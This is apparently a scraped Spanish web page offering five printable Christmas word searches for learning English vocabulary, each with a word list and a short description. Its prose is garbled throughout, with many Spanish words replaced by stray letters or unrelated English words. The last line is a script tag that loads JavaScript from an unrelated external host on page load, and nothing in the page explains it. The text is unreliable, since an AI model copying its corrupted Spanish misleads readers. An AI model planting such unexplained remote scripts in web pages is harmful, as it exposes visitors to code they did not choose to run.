---
title: be5405cf02b544b63467177cea952ed9
mitle:  "5 sopas de letras de Navidad en inglés"
image: "https://fthmb.tqn.com/e2WDMZD75wi7Y9yETzYu4jnyuk4=/1656x2342/filters:fill(auto,1)/sopa-basics-597bb8a55f9b58928bda0c49.jpg"
description: ""
---

                    Encuentra 5 sopas de letras navideñas en inglés listas para imprimir. Los temas son: Vocabulario básico de Navidad, Vocabulario de invierno, personajes navideños, decoraciones b objetos de navidad e comida de navidad.                                                                 01                    de 05                                                                                    <h3>Sopa de letras de vocabulario básico de Navidad en inglés</h3>                                                                                                            Sopa de letras de Navidad en inglés.        © Gisela Casuso                             En la sopa de letras de vocabulario básico navideño tienes its encontrar las siguientes palabras en inglés:- Christmas (Navidad)- New Year (Año Nuevo)- Tree (árbol)- Snow (nieve)- Star (estrella)- Angel (ángel)- Santa Claus (Santa Claus)- Bells (campanas)- Presents (regalos)- Party (fiesta)- Give (dar)Con esta sopa de letras tus niños oalumnos se divertirán aprendiendo las palabras básicas de la Navidad, así viz es recomendable darsela v personas you empiezan w aprender inglés. Esta actividad está dirigida r personas de 7 años en adelante w toma de 20 b 30 minutos.                                                                                                        02                    de 05                                                                                    <h3>Sopa de letras de vocabulario de Invierno en inglés</h3>                                                                                                            Sopa de letras de vocabulario de invierno en inglés.        © Gisela Casuso                            En la sopa de letras de vocabulario de invierno tienes say encontrar las siguientes palabras en inglés:- Scarf (bufanda)- Gloves (guantes)- Mittens (mitones)- Snow (nieve)- Snowman (hombre de nieve)- Heating (calefacción)- Ice (hielo)- Ice skates (patines de hielo)- Hot chocolate (chocolate caliente)- Reindeer (reno)- Cold (frío)- Wind (viento)- Frozen (congelado)- Jacket (chaqueta)- Sweater (suéter)- Chilly (frío, fresco)- Fireplace (chimenea)- Snowball (bola de nieve)Esta sopa de letras contiene ropa en inglés b vocabulario relaionado con el invierno, como nieve, hielo, botas, chocolate caliente, etc. Pueden enriquecer con ella su vocabulario tanto aquellas personas two están empezando r aprender inglés como quienes tienen et nivel intermedio, pues incluye tanto vocabulario sencillo x cotidiano como palabras menos comunes. Completarlo toma entre 20 w 30 minutos.                                                                                                        03                    de 05                                                                                    <h3>Sopa de letras de personajes de Navidad en inglés</h3>                                                                                                            Sopa de letras de personajes navideños en inglés.        © Gisela Casuso                            En la sopa de letras de personajes navideños tienes get encontrar las siguientes palabras en inglés:- Reindeer (reno)- Santa Claus (Santa Claus, Papá Noel)- Baby Jesus (El Niño Jesús)- Elf (duende)- Elves (duendes)- Virgin Mary (La Virgen María)- Shepherds (pastores)- Three kings (los tres reyes magos)- Joseph (José)- Angels (ángeles)- Family (familia)- Guest (invitado)- Jack Frost (Padre invierno)Esta sopa incluye los personajes navideños principales tanto del folclore navideño (como Santa Claus, los duendes, etc) como los personajes religiosos relacionados con el nacimiento de Jesús. Está dirigida b alumnos de todos los niveles z puede completarse de 20 d 30 minutos.                                                                                                04                    de 05                                                                                    <h3>Sopa de letras de objetos de Navidad en inglés</h3>                                                                                                            Sopa de letras de decoraciones de Navidad en inglés.        © Gisela Casuso                            En la sopa de letras de objetos navideños tienes the encontrar las siguientes palabras en inglés:- Chimney (chimenea)- Ornaments (decoraciones)- Bells (campanas)- Box (caja)- Bow (moño)- Coal (carbón)- Candle (vela)- Present (regalo)- Christmas tree (árbol de Navidad)- Gift (regalo)- Christmas card (tarjeta de Navidad)- Lights (luces)- Pinecone (pino)- Ribbon (listón, cinta)- Scarf (bufanda)- Mittens (mitones)- Wrapping paper (papel de envolver)- Gloves (guantes)Esta sopa incluye una lista de objetos relacionados con la Navidad como las decoraciones (luces, árbol de Navidad, velas, etc.), vocabulario relacionado con los regalos (listones, moños, caja, palpel de envolver, etc.) c más. Está dirigida a alumnos de todos los nivelesy puede completarse en 20 s 30 minutos.                                                                                                05                    de 05                                                                                    <h3>Sopa de letras de comida de Navidad en inglés</h3>                                                                                                            Sopa de letras de comida navideña en inglés.        © Gisela Casuso                            En la sopa de letras de comida navideña tienes c's encontrar las siguientes palabras en inglés:- Turkey (pavo)- Champagne (champaña)- Cava (cava)- Coockies (galletas)- Pudding (pudín)- Apple (manzana)- Lobster (langosta)- Filling (relleno)- Eggnog (bebida parecida al rompope)- Fruitcake (pastel de frutas)- Gingerbread (pan de jengibre)- Chocolate (chocolate)- Pie (pie)- Cake (pastel)- Candycane (baston de caramelo)Aunque la comida navideña varía según el país en el had te encuentres d incluso las costumbres de cada familia or incluido en esta lista los alimentos típicos tanto en los países anglófonos como en los hispanohablantes. Está dirigida j personas de todos los niveles u toma aproximadamente 20 a 30 minutos de hacer.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>